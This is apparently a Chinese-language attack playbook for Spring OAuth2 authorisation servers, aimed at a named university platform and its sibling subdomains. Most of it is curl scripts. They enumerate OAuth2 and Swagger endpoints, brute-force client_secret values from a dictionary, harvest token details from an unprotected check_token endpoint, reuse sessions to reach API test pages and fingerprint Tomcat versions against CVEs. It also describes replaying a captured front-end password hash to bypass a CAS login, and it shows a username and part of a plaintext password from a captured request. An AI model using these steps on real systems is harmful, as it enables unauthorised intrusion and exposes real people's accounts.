# Spring OAuth2 Authorization Server 发现与端点枚举

> 实战目标：i.xawl.edu.cn（西安文理学院大数据智能决策辅助平台）
> API 前缀：`/biz-api/`
> OAuth2 客户端 ID：`client-api-resource`
> Tomcat 版本：8.0.17

## OAuth2 授权服务器端点模式

Spring Security OAuth2 的默认端点路径：

| 端点 | 路径 | 方法 | 存在时返回 |
|------|------|------|-----------|
| 授权码请求 | `/oauth/authorize` | GET | 302 重定向到登录页 |
| Token 发放 | `/oauth/token` | POST | 405 (GET) / 401 (POST 无认证) |
| Token 校验 | `/oauth/check_token` | GET | 400 `Required String parameter 'token'` |
| Token 撤销 | `/oauth/revoke_token` | POST | 无此端点 → 404 |
| 错误页 | `/oauth/error` | GET | 404 → 端点不存在 |
| Swagger HTML | `/swagger-ui.html` | GET | 302 重定向到自身（需 auth） |

## 发现流程

```bash
# 1. 批量探测标准端点
for path in \
  "/oauth/authorize?response_type=code&client_id=test&redirect_uri=http://localhost" \
  "/oauth/token" \
  "/oauth/check_token" \
  "/oauth/error" \
  "/oauth/revoke_token" \
  "/swagger-ui.html"; do
  code=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "https://target.com/api-prefix$path")
  echo "[$code] $path"
done
```

### 响应特征对照

| 返回码 | 含义 |
|--------|------|
| 405 | 端点存在（方法不被允许，说明 GET 不支持，POST 可能可） |
| 400 + `Required String parameter 'token'` | `/oauth/check_token` 端点存在 |
| 401 + `unauthorized` + `no client authentication` | 端点存在，需要 `client_id:client_secret` Basic Auth |
| 404 | 端点不存在（Tomcat 默认 404 页面） |
| 302 | 端点存在，需要重定向（先跳 CAS 认证） |

## client_secret 枚举

OAuth2 的 token 端点需要客户端认证。Spring Security OAuth2 默认支持 **Basic Auth**（`-u client_id:client_secret`）和 **request body**（`client_id=xxx&client_secret=yyy`）两种方式。

```bash
# Basic Auth 方式
curl -sk -X POST "https://target.com/biz-api/oauth/token" \
  -u "client-api-resource:guessed_secret" \
  -d "grant_type=client_credentials"

# 常见 client_secret 字典
for s in "client-api-resource" "client-api-resource-secret" \
         "secret" "password" "admin" "123456" \
         "api-secret-123" "default" "test" "changeme"; do
  resp=$(curl -sk -X POST "..." -u "client-id:$s" -d "grant_type=client_credentials" 2>/dev/null)
  echo "$s => $resp"
done
```

### 响应分析

| 响应 | 含义 |
|------|------|
| `"unauthorized"` + `"Bad credentials"` | client_id 存在但 secret 错误（安全的做法） |
| `"unauthorized"` + `"no client authentication"` | 未传认证头 |
| `"invalid_client"` | client_id 不存在 |
| `{"access_token":"...", "token_type":"bearer"}` | 成功！拿到 token |

## token 校验端点利用

`/oauth/check_token` 端点可以验证任意 token 是否有效，泄露 token 关联的信息：

```bash
# 传无效 token
curl -s "https://target.com/biz-api/oauth/check_token?token=invalid"
# → {"error":"invalid_token","error_description":"Invalid access token: invalid"}

# 如果传有效 token（需要先获取）
curl -s "https://target.com/biz-api/oauth/check_token?token=VALID_TOKEN"
# → {"active":true,"client_id":"client-api-resource","user_name":"admin","scope":["read","write"],"exp":1234567890}
# 泄露：client_id、用户名、scope、过期时间
```

⚠️ 如果 check_token 端点未做 ACL 保护（无认证），这就是一个**信息泄露漏洞**——攻击者可批量验证/爆破 access_token。

## 授权码流程（CAS 链式认证）

当 OAuth2 服务器后接 CAS 统一认证时，可以通过链式认证拿到授权码：

```
Step 1: CAS 登录 → 获取 CASTGC + 重定向验证 ticket
Step 2: ticket → j_spring_cas_security_check → 验证成功 → 设置 JSESSIONID
Step 3: 用 JSESSIONID 访问 /oauth/authorize → CAS 跳转被跳过（已有认证）
Step 4: 获得授权码 code=xxx（附加在 redirect_uri 上）
```

### 注意事项

- 授权码 `code` 通常很短（如 `g18bdC`），不像标准 UUID。短 code 不代表安全等级低。
- 拿到 code 后换 token 仍需 `client_secret`（除非客户端配置了 `secretRequired=false`）。
- 如果 client_secret 不可得，**仍可通过 JSESSIONID 直接访问 Web 页面和相关 API 测试工具**。

## 访问 API 测试页面

Spring OAuth2 + 树维平台（上海树维信息科技）等教育系统常附带 API 测试页面：

```bash
# 在 biz-api 上下文中找到测试页面
curl -sk -b "JSESSIONID=xxx" "https://target.com/biz-api/html/apitest/index.html"
# → 返回 API 测试界面（树维平台 UI）
# 页面包含：工作流/CMS/留言板的 API 测试用例
```

### 前端 Token 机制（Metronic.js 模式）

树维平台前端的 Metronic.js 框架使用 **cookie 中的 access_token** 来认证 API 请求：

```javascript
// metronic.js 关键代码
access_token : function() {
    // 从 cookie 读取 access_token
    var cookies = document.cookie.split("; ");
    for(var i = 0; i < cookies.length; i++) {
        var s = cookies[i].split("=");
        if(s[0] == "access_token") { access_token = s[1]; }
        if(s[0] == "modulus") { modulus = s[1]; }
        if(s[0] == "exponent") { exponent = s[1]; }
    }
    // 如果 cookie 中有 modulus+exponent 且 localStorage 有 private key
    // 则解密 access_token
    if(access_token && modulus && exponent && localStorage["private"]) {
        var decoder = new RSAKey();
        decoder.setPrivate(modulus, exponent, localStorage["private"]);
        return decoder.decrypt(access_token);
    }
    return access_token;
}

getUrlWithToken: function(url) {
    url += (url.indexOf('?') > 0 ? '&' : '?') + 'access_token=' + Metronic.access_token();
    url += (url.indexOf('?') > 0 ? '&' : '?') + '_=' + new Date().getTime();
    return url;
}
```

这意味着：
1. `access_token` 存储在 cookie 中（`document.cookie`）
2. 每次 AJAX 请求都会把 token 加到 URL 参数中
3. API 路径为：`/biz-api/api/rest/xxx`
4. 响应格式：`{"status": "OK", "response": {...}}`

### 直接调用 API 测试

```bash
# 首先从 cookie jar 确认是否有 access_token cookie
grep access_token cookies.txt

# 如果没有，只能访问 HTML 页面（JSP 需要 JSESSIONID）
# API 端点需要 OAuth token (access_token)
curl -sk -b "JSESSIONID=xxx" "https://target.com/biz-api/api/rest/users?method=currentUser"
# → {"error":"unauthorized","error_description":"An Authentication object was not found in the SecurityContext"}
```

```bash
## 跨主机 Swagger 发现

确定 OAuth2 服务器后，在同组织的其他子系统上探测 Swagger——不同系统可能使用不同后端框架（Spring Boot / 自研 / 传统 JSP），Swagger 暴露情况也不同：

```bash
# 在多主机上批量探测 Swagger
for host in "target1.domain.com" "target2.domain.com" "target3.domain.com"; do
  for path in "/swagger-ui.html" "/v2/api-docs" "/v3/api-docs" "/doc.html"; do
    code=$(curl -skL -o /dev/null -w "%{http_code}" --connect-timeout 5 "https://$host$path")
    echo "[$code] $host$path"
  done
done
```

### 不同响应模式的含义

| 响应码 | 含义 | 示例 |
|--------|------|------|
| 200 + Swagger HTML | 完全开放 | Swagger UI 正常渲染 |
| 200 + 错误页 | 路径存在但后端返回通用错误（如正方OA系统） | `oa.xawl.edu.cn` — 200 但内容是乱码错误页 |
| 203 + JSON | **后端 API 存在但需要认证！** 203 是代理/网关转发标志 | `fresh.xawl.edu.cn` — `{"msg":"会话过期,请重新登录!"}` |
| 302 → 登录页 | 需要认证 | 常见于 Spring Security + CAS |
| 302 → 自身（循环） | Swagger 路径被安全过滤器捕获但无正确重定向目标 | `i.xawl.edu.cn/biz-api/swagger-ui.html` |
| 404 | 路径不存在 | 默认 |

### 取证分析：203 响应的含义

```bash
# 203 Non-Authoritative Information — 通常由代理/网关层返回
# 实际含义取决于后端逻辑

# 如果 203 + JSON 内容：
curl -sk "https://fresh.xawl.edu.cn/v2/api-docs"
# {"msg":"会话过期,请重新登录!","success":false}
# → 后端 API 存在！返回的是认证错误，不是 404
# → 说明 Swagger 文档真实存在于该端点，但被认证拦截器保护
# → 拿到 session 后可以访问

# 区分 203 实际含义：
# 1. 检查 Content-Type 是否为 application/json → API 风格响应
# 2. 检查响应结构是否统一（如 {"msg":..., "success":false}）
# 3. 对比首页 size（如果 size 一致则是 SPA fallback）
# 4. 对比其他已知 API 端点的错误格式
```

### 针对 302 循环的应对

当 `/swagger-ui.html` 返回 302 到自身（无限循环），Swagger UI 基本不可用。但可以尝试：

```bash
# 1. 检查是否有独立于 UI 的 api-docs JSON 端点
curl -skO /dev/null -w "%{http_code}" "https://target.com/v2/api-docs"
curl -skO /dev/null -w "%{http_code}" "https://target.com/v3/api-docs"
curl -skO /dev/null -w "%{http_code}" "https://target.com/swagger-resources"

# 2. 检查 knife4j 路径（国产增强版 Swagger）
curl -skO /dev/null -w "%{http_code}" "https://target.com/doc.html"

# 3. 用认证后的 session 尝试
curl -sk -b "JSESSIONID=xxx" "https://target.com/swagger-ui.html"
# 有些 Spring Boot 配置对/oauth 路径做了拦截但遗漏了 swagger 静态资源
curl -sk "https://target.com/biz-api/swagger-ui.html"
# → 302 或 200

# OpenAPI JSON (v2)
curl -sk "https://target.com/biz-api/v2/api-docs"

# OpenAPI JSON (v3)
curl -sk "https://target.com/biz-api/v3/api-docs"

# Swagger Resources
curl -sk "https://target.com/biz-api/swagger-resources"
```

**注意**：Swagger UI 可能被 CAS/Spring Security 保护（302 跳登录页），但 `v2/api-docs` 和 `v3/api-docs` 有时是公开的（未做 ACL）。

## Tomcat 版本泄露

通过错误页面获取 Tomcat 确切版本：

```bash
# 访问不存在的端点触发 404
curl -sk "https://target.com/biz-api/nonexistent"
# 返回：Apache Tomcat/8.0.17

# 访问 check_token 不带参数
curl -sk "https://target.com/biz-api/oauth/check_token"  
# 返回：HTTP Status 400 - Required String parameter 'token' is not present
# 底部：Apache Tomcat/8.0.17
```

Tomcat 8.0.x（2015年发布，2018年EOL）存在已知 CVE：
- CVE-2017-12615：PUT 方法 RCE（仅 Windows，需配置 readonly=false）
- CVE-2019-0232：CGI 任意命令执行（需 enableCmdLineArguments）

## Spring OAuth2 + 前端密码加密

**重要发现：** 在某些 CAS/SSO 系统中，密码在提交前会经过前端 JS 哈希（SM3/SHA256 多次迭代）：

```
URL: POST /cas/login?service=...&renew=true&username=xxx&password=Cc11200...
Body: username=2905220233&password=0a9c850cda5a331d95c2de188a78cfde...
       [512 hex chars = 256 bytes hash, 非标准哈希长度]
```

特征：
- URL 中的 `password=Cc11200...` 是明文密码（被用户输入时 URL 参数携带）
- POST body 中的 password 是计算后的哈希值
- 哈希长度超出标准 SHA256/SM3（64 hex）→ 可能是**多次迭代**或**自定义算法**
- 应对策略：直接使用 POST body 中的哈希值即可绕过前端逻辑，无需逆向哈希算法

## Pitfalls

1. **client_id 枚举**：Spring OAuth2 对 `invalid_client` vs `Bad credentials` 的区分可能泄露 client_id 是否存在
2. **check_token ACL**：部分系统未对 check_token 做认证，导致 token 信息泄露
3. **Swagger 可能被保护**：虽然 swagger-ui.html 存在，但后端可能配置了 isAuthenticated() 拦截
4. **Tomcat 版本可能不直接显示**：如果 nginx 代理层拦截了 404 页面，就看不到后端 Tomcat 版本
5. **OAuth2 端点前缀可能不同**：不一定在 `/oauth/` 下，有时在 `/api/oauth/` 或 `/biz-api/oauth/`，需要先确认 API base path
